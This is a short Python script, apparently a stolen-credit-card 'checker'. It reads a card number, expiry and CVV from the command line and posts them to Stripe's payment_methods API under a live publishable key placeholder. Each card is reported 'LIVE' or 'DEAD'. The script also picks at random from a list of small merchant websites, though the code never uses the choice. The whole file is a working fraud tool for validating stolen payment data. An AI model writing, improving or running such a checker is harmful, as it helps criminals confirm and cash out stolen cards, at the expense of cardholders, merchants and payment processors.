#!/usr/bin/env python3
import requests
import sys
import json
import random

def check_card(card):
    try:
        cc, mm, yy, cvv = card.split('|')
        if len(yy) == 2:
            yy = '20' + yy
            
        sites = [
            "babyboom.ie",
            "dominileather.com",
            "girlslivingwell.com",
            "shop.wattlogic.com"
        ]
        
        site = random.choice(sites)
        
        url = f"https://api.stripe.com/v1/payment_methods"
        headers = {
            'Authorization': 'Bearer pk_live_xxx',
            'Content-Type': 'application/x-www-form-urlencoded'
        }
        data = {
            'type': 'card',
            'card[number]': cc,
            'card[exp_month]': mm,
            'card[exp_year]': yy,
            'card[cvc]': cvv
        }
        
        response = requests.post(url, data=data, headers=headers, timeout=15)
        result = response.json()
        
        if 'id' in result:
            return {"status": "LIVE", "msg": "Auth Success"}
        else:
            return {"status": "DEAD", "msg": result.get('error', {}).get('message', 'Declined')}
            
    except Exception as e:
        return {"status": "DEAD", "msg": str(e)}

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print(json.dumps({"status": "DEAD", "msg": "No card"}))
        sys.exit(1)
    
    result = check_card(sys.argv[1])
    print(json.dumps(result))
